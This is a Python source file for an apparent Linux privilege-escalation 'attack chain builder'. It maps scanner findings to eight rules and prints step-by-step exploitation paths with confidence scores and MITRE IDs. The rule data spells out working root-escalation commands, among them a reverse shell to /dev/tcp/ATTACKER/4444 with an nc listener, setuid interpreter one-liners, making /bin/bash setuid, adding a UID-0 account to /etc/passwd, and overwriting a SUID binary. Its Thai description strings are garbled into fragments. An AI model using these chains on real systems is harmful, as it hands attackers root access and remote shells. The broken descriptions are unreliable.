#!/usr/bin/env python3
"""
 COSVINTE — Attack Chain Builder
 findings scanner attack path exploit 
 step-by-step confidence score
"""

import os
from datetime import datetime

from cosvinte_utils import (
    Color, c, severity_badge, print_banner as _print_banner,
)

# ==============================
# Chain Rules
# ==============================
CHAIN_RULES = [
    {
        "id": "CHAIN-001",
        "name": "Cron Job + Writable Script Execution",
        "name_th": "Cron Job script ",
        "description_th": "Cron job root script directory command cron ",
        "severity": "CRITICAL",
        "base_confidence": 90,
        "required_sources": ["cron", "writable"],
        "steps_th": [
            " cron job root: crontab -l && ls -la /etc/cron.*",
            " script : ls -la <script_path>",
            " reverse shell: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> <script>",
            " cron ",
            " shell: nc -lvnp 4444 → ROOT SHELL",
        ],
        "mitre": "T1053.003",
        "conditions": [
            {"source": "cron",     "field": "category", "match": "any"},
            {"source": "writable", "field": "path",     "match": "any"},
        ],
    },
    {
        "id": "CHAIN-002",
        "name": "Writable PATH Dir + Cron Command Hijack",
        "name_th": "PATH Directory + Cron relative command",
        "description_th": " directory PATH cron job command absolute path binary cron ",
        "severity": "CRITICAL",
        "base_confidence": 85,
        "required_sources": ["path", "cron"],
        "steps_th": [
            " PATH: echo $PATH dir ls -ld",
            " cron command / : grep -r '' /etc/cron.* | grep -v '/'",
            " binary writable PATH dir: echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/<cmd> && chmod +x /tmp/<cmd>",
            " cron → /bin/bash -p → ROOT SHELL",
        ],
        "mitre": "T1574.007",
        "conditions": [
            {"source": "path", "field": "world_writable", "match": "true"},
            {"source": "cron", "field": "category",       "match": "any"},
        ],
    },
    {
        "id": "CHAIN-003",
        "name": "Dangerous Capability on Interpreter",
        "name_th": "Interpreter (python/perl/ruby) cap_setuid",
        "description_th": "Python, Perl, Ruby Node cap_setuid one-liner root ",
        "severity": "CRITICAL",
        "base_confidence": 95,
        "required_sources": ["caps"],
        "steps_th": [
            " capability: getcap <binary_path>",
            "Python: <binary> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "Perl:   <binary> -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'",
            "Ruby:   <binary> -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
            "→ ROOT SHELL ",
        ],
        "mitre": "T1548.001",
        "conditions": [
            {"source": "caps", "field": "is_interpreter", "match": "true"},
            {"source": "caps", "field": "capability",     "match": "contains_any",
             "values": ["cap_setuid", "cap_sys_admin", "cap_setgid"]},
        ],
    },
    {
        "id": "CHAIN-004",
        "name": "Writable /etc/passwd → Add Root Account",
        "name_th": "/etc/passwd → root account ",
        "description_th": " /etc/passwd user UID=0 chain ",
        "severity": "CRITICAL",
        "base_confidence": 99,
        "required_sources": ["writable"],
        "steps_th": [
            ": ls -la /etc/passwd",
            " password hash: openssl passwd -1 -salt xyz P@ssword123",
            " root user: echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd",
            " user: su hacker → ROOT SHELL",
        ],
        "mitre": "T1136.001",
        "conditions": [
            {"source": "writable", "field": "path", "match": "path_contains",
             "values": ["/etc/passwd", "/etc/shadow"]},
        ],
    },
    {
        "id": "CHAIN-005",
        "name": "Kernel Exploit + Weakened Memory Protections",
        "name_th": "Kernel + ASLR/SMEP ",
        "description_th": " kernel CVE memory protection (ASLR=0) exploit kernel ",
        "severity": "CRITICAL",
        "base_confidence": 75,
        "required_sources": ["kernel"],
        "steps_th": [
            " kernel version: uname -r",
            " ASLR: cat /proc/sys/kernel/randomize_va_space (0==)",
            " SMEP: grep -m1 flags /proc/cpuinfo | grep smep",
            "Download PoC exploit-db CVE match",
            "Compile : gcc exploit.c -o pwn && ./pwn → ROOT SHELL",
        ],
        "mitre": "T1068",
        "conditions": [
            {"source": "kernel", "field": "status", "match": "equals",
             "values": ["VULNERABLE"]},
        ],
    },
    {
        "id": "CHAIN-006",
        "name": "SUID Binary + Writable Library Directory",
        "name_th": "SUID Binary library directory ",
        "description_th": "SUID binary shared library directory .so binary code root",
        "severity": "CRITICAL",
        "base_confidence": 78,
        "required_sources": ["path", "writable"],
        "steps_th": [
            " SUID binary: find / -perm -4000 -type f 2>/dev/null",
            " library : ldd <binary> .so writable dir",
            " malicious .so: gcc -shared -fPIC -o /writable_dir/target.so payload.c",
            " SUID binary → .so root → ROOT SHELL",
        ],
        "mitre": "T1574.006",
        "conditions": [
            {"source": "path",     "field": "dangerous", "match": "true"},
            {"source": "writable", "field": "path",      "match": "any"},
        ],
    },
    {
        "id": "CHAIN-007",
        "name": "cap_dac_override + Overwrite SUID Binary",
        "name_th": "cap_dac_override SUID binary",
        "description_th": "Binary cap_dac_override permission check SUID binary ( /usr/bin/passwd) payload",
        "severity": "CRITICAL",
        "base_confidence": 82,
        "required_sources": ["caps", "path"],
        "steps_th": [
            " cap_dac_override: getcap <binary>",
            " SUID binary : find / -perm -4000 2>/dev/null",
            " payload: echo -e '#!/bin/bash\\nbash -p' > /tmp/payload && chmod +x /tmp/payload",
            " SUID: <cap_binary> cp /tmp/payload /usr/bin/passwd",
            " /usr/bin/passwd → ROOT SHELL",
        ],
        "mitre": "T1574.010",
        "conditions": [
            {"source": "caps", "field": "capability", "match": "contains_any",
             "values": ["cap_dac_override", "cap_dac_read_search"]},
            {"source": "path", "field": "dangerous",  "match": "true"},
        ],
    },
    {
        "id": "CHAIN-008",
        "name": "Relative PATH Entry + SUID Subcommand Hijack",
        "name_th": "PATH relative entry + SUID command path",
        "description_th": " '.' PATH SUID binary sub-command relative hijack current directory",
        "severity": "HIGH",
        "base_confidence": 70,
        "required_sources": ["path"],
        "steps_th": [
            " relative PATH: echo $PATH ( '.' path /)",
            " SUID binary command relative: strings <suid_binary> | grep -v '/' | grep -E '^[a-z]'",
            " script current dir: echo -e '#!/bin/bash\\nbash -p' > ./<cmd> && chmod +x ./<cmd>",
            " SUID binary directory → command hijack → ROOT SHELL",
        ],
        "mitre": "T1574.007",
        "conditions": [
            {"source": "path", "field": "relative",  "match": "true"},
            {"source": "path", "field": "dangerous",  "match": "true"},
        ],
    },
]

# ==============================
# Memory Protection Check
# ==============================
def check_memory_protections() -> dict:
    result = {}
    try:
        with open("/proc/sys/kernel/randomize_va_space") as f:
            aslr_val = int(f.read().strip())
        result["aslr"] = {
            "value":      aslr_val,
            "status":     "enabled" if aslr_val == 2 else ("partial" if aslr_val == 1 else "disabled"),
            "risk_bonus": 0 if aslr_val == 2 else (0.5 if aslr_val == 1 else 1.5),
        }
    except Exception:
        result["aslr"] = {"value": "unknown", "status": "unknown", "risk_bonus": 0.3}

    try:
        with open("/proc/cpuinfo") as f:
            flags_line = next((l for l in f if l.startswith("flags")), "")
        result["smep"] = {"enabled": "smep" in flags_line}
        result["smap"] = {"enabled": "smap" in flags_line}
        result["nx"]   = {"enabled": "nx"   in flags_line}
    except Exception:
        for key in ("smep", "smap", "nx"):
            result[key] = {"enabled": "unknown"}

    return result

# ==============================
# Condition Evaluator
# ==============================
def _eval_condition(cond: dict, findings_by_source: dict) -> tuple:
    source = cond["source"]
    field  = cond["field"]
    match  = cond["match"]
    values = cond.get("values", [])
    items  = findings_by_source.get(source, [])

    matched = []
    for item in items:
        val = item.get(field)
        if match == "any":
            matched.append(item)
        elif match == "true":
            if val is True or val == 1:
                matched.append(item)
        elif match == "equals":
            if str(val) in [str(v) for v in values]:
                matched.append(item)
        elif match == "contains_any":
            if val and any(v.lower() in str(val).lower() for v in values):
                matched.append(item)
        elif match == "path_contains":
            if val and any(v in str(val) for v in values):
                matched.append(item)
    return len(matched) > 0, matched

# ==============================
# Confidence Calculator
# ==============================
def _calc_confidence(rule: dict, matched_map: dict, mem: dict) -> int:
    score = rule["base_confidence"]
    if all(s in matched_map for s in rule["required_sources"]):
        score = min(score + 5, 99)
    if "kernel" in rule["required_sources"]:
        aslr = mem.get("aslr", {}).get("status", "unknown")
        if aslr == "disabled":   score = min(score + 20, 99)
        elif aslr == "partial":  score -= 5
        elif aslr == "enabled":  score -= 15
    missing = [s for s in rule["required_sources"] if s not in matched_map]
    score -= len(missing) * 15
    return max(min(score, 99), 5)

# ==============================
# Core Chain Builder
# ==============================
def build_chains(reports: dict) -> list:
    findings_by_source = {}

    if reports.get("caps"):
        findings_by_source["caps"] = reports["caps"].get("findings", [])
    if reports.get("cron"):
        findings_by_source["cron"] = reports["cron"].get("findings", [])
    if reports.get("kernel"):
        findings_by_source["kernel"] = reports["kernel"].get("findings", [])
    if reports.get("path"):
        path_items = []
        for item in reports["path"].get("path_analysis", []):
            item.setdefault("_origin", "path_analysis")
            path_items.append(item)
        for item in reports["path"].get("suid_binaries", []):
            item.setdefault("_origin", "suid")
            path_items.append(item)
        findings_by_source["path"] = path_items
    if reports.get("writable"):
        findings_by_source["writable"] = reports["writable"].get("writable_paths", [])

    mem    = check_memory_protections()
    chains = []

    for rule in CHAIN_RULES:
        matched_map = {}
        for cond in rule["conditions"]:
            met, items = _eval_condition(cond, findings_by_source)
            if met:
                src      = cond["source"]
                existing = matched_map.get(src, [])
                for it in items:
                    key = str(it.get("cve") or it.get("path") or it.get("binary") or id(it))
                    if not any(
                        str(e.get("cve") or e.get("path") or e.get("binary") or id(e)) == key
                        for e in existing
                    ):
                        existing.append(it)
                matched_map[src] = existing

        has_match = any(s in matched_map for s in rule["required_sources"] if s in reports)
        if not has_match:
            continue

        chains.append({
            "id":             rule["id"],
            "name":           rule["name"],
            "name_th":        rule["name_th"],
            "description_th": rule["description_th"],
            "severity":       rule["severity"],
            "confidence":     _calc_confidence(rule, matched_map, mem),
            "mitre":          rule["mitre"],
            "steps_th":       rule["steps_th"],
            "evidence":       matched_map,
            "sources_used":   list(matched_map.keys()),
            "mem_protections": mem,
        })

    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    chains.sort(key=lambda x: (sev_order.get(x["severity"], 9), -x["confidence"]))
    return chains

# ==============================
# Pretty Print
# ==============================
def _confidence_bar(conf: int, width: int = 20) -> str:
    filled = int((conf / 100.0) * width)
    bar    = "█" * filled + "░" * (width - filled)
    col    = Color.RED + Color.BOLD if conf >= 85 else (Color.YELLOW if conf >= 60 else Color.GREEN)
    return f"{col}{bar}{Color.RESET} {Color.BOLD}{conf}%{Color.RESET}"

def print_banner():
    _print_banner('Attack Chain Builder  |  "Conquer Vulnerabilities"')

def print_mem_protections(mem: dict):
    print(c(Color.CYAN + Color.BOLD, "  ╔══ MEMORY PROTECTIONS ══════════════════════════════════════╗"))
    aslr   = mem.get("aslr", {})
    status = aslr.get("status", "unknown")
    col    = Color.GREEN if status == "enabled" else (Color.YELLOW if status == "partial" else Color.RED)
    aslr_val = aslr.get("value", "?")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,'ASLR  :')} {c(col+Color.BOLD, status.upper())}  {c(Color.GRAY, '(value=' + str(aslr_val) + ', 2=normal 0=disabled)')}")
    for key in ("smep", "smap", "nx"):
        val = mem.get(key, {}).get("enabled", "unknown")
        col = Color.GREEN if val is True else (Color.RED if val is False else Color.GRAY)
        label = "ENABLED" if val is True else ("DISABLED" if val is False else "UNKNOWN")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY, f'{key.upper():<6}:')} {c(col+Color.BOLD, label)}")
    print(c(Color.CYAN + Color.BOLD, "  ╚══════════════════════════════════════════════════════════════╝\n"))

def print_chains(chains: list):
    if not chains:
        print(c(Color.GREEN + Color.BOLD, "\n ✔ Attack Chain findings \n"))
        return

    crit = sum(1 for ch in chains if ch["severity"] == "CRITICAL")
    high = sum(1 for ch in chains if ch["severity"] == "HIGH")
    print(c(Color.RED + Color.BOLD, f"\n ⚡ {len(chains)} ATTACK CHAIN ({crit} CRITICAL, {high} HIGH)\n"))

    for idx, chain in enumerate(chains, 1):
        sev     = chain["severity"]
        conf    = chain["confidence"]
        hdr_col = Color.BG_RED + Color.BOLD if sev == "CRITICAL" else Color.RED + Color.BOLD

        chain_hdr = f'╔══ CHAIN #{idx}  {chain["id"]} ══════════════════════════════════════'
        print(f"  {c(hdr_col, chain_hdr)}")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.BOLD+Color.WHITE, chain['name'])}")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.CYAN, chain['name_th'])}")
        print(f"  {c(Color.CYAN,'║')}")
        print(f"  {c(Color.CYAN,'║')}  Severity   : {severity_badge(sev)}  │  Confidence : {_confidence_bar(conf)}")
        print(f"  {c(Color.CYAN,'║')}  MITRE      : {c(Color.BLUE, chain['mitre'])}  │  Sources   : {c(Color.MAGENTA, ', '.join(chain['sources_used']))}")
        print(f"  {c(Color.CYAN,'║')}")

        # Description Thai (word wrap)
        print(f" {c(Color.CYAN,'║')} {c(Color.GRAY,'📋 :')}")
        words, line = chain["description_th"].split(), ""
        for word in words:
            if len(line) + len(word) + 1 > 60:
                print(f"  {c(Color.CYAN,'║')}    {c(Color.WHITE, line)}")
                line = word
            else:
                line = f"{line} {word}".strip()
        if line:
            print(f"  {c(Color.CYAN,'║')}    {c(Color.WHITE, line)}")

        # Steps
        print(f"  {c(Color.CYAN,'║')}")
        print(f" {c(Color.CYAN,'║')} {c(Color.YELLOW+Color.BOLD,'⚡ :')}")
        for i, step in enumerate(chain["steps_th"], 1):
            lines = step.split("\n")
            print(f"  {c(Color.CYAN,'║')}    {c(Color.ORANGE, str(i)+'.')} {c(Color.GRAY, lines[0])}")
            for extra in lines[1:]:
                print(f"  {c(Color.CYAN,'║')}       {c(Color.GRAY, extra.strip())}")

        # Evidence
        print(f"  {c(Color.CYAN,'║')}")
        print(f" {c(Color.CYAN,'║')} {c(Color.GREEN,'🔍 Evidence :')}")
        for src, items in chain["evidence"].items():
            for item in items[:2]:
                label    = (item.get("cve") or item.get("binary") or item.get("path") or str(item)[:40])
                sev_item = item.get("severity", item.get("status", ""))
                print(f"  {c(Color.CYAN,'║')}    {c(Color.GRAY, f'[{src}]')} {c(Color.WHITE, str(label))}  {c(Color.YELLOW, sev_item) if sev_item else ''}")
            if len(items) > 2:
                print(f" {c(Color.CYAN,'║')} {c(Color.GRAY, f' ... {len(items)-2} ')}")

        print(f"  {c(hdr_col, '╚══════════════════════════════════════════════════════════════')}\n")

def print_summary(chains: list):
    if not chains:
        return
    crit     = sum(1 for ch in chains if ch["severity"] == "CRITICAL")
    high     = sum(1 for ch in chains if ch["severity"] == "HIGH")
    avg_conf = int(sum(ch["confidence"] for ch in chains) / len(chains))
    print(f"\n{c(Color.CYAN+Color.BOLD, '  ╔══ ATTACK CHAIN SUMMARY ══════════════════════════════════════╗')}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,'Total Chains Detected :')} {c(Color.WHITE+Color.BOLD, str(len(chains)))}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.BG_RED+Color.BOLD,'  CRITICAL             :')} {c(Color.RED+Color.BOLD, str(crit))}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.RED,   '  HIGH                 :')} {c(Color.RED+Color.BOLD, str(high))}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,  'Avg Confidence        :')} {c(Color.YELLOW+Color.BOLD, f'{avg_conf}%')}")
    print(f"  {c(Color.CYAN,'║')}")
    print(f" {c(Color.CYAN,'║')} {c(Color.YELLOW,'⚠ Remediation Roadmap ')}")
    print(c(Color.CYAN+Color.BOLD, '  ╚══════════════════════════════════════════════════════════════╝\n'))

def chains_to_report_dict(chains: list) -> list:
    result = []
    for ch in chains:
        entry = {k: v for k, v in ch.items() if k not in ("evidence", "mem_protections")}
        entry["evidence_summary"] = {
            src: [str(it.get("cve") or it.get("binary") or it.get("path") or "") for it in items[:3]]
            for src, items in ch.get("evidence", {}).items()
        }
        result.append(entry)
    return result
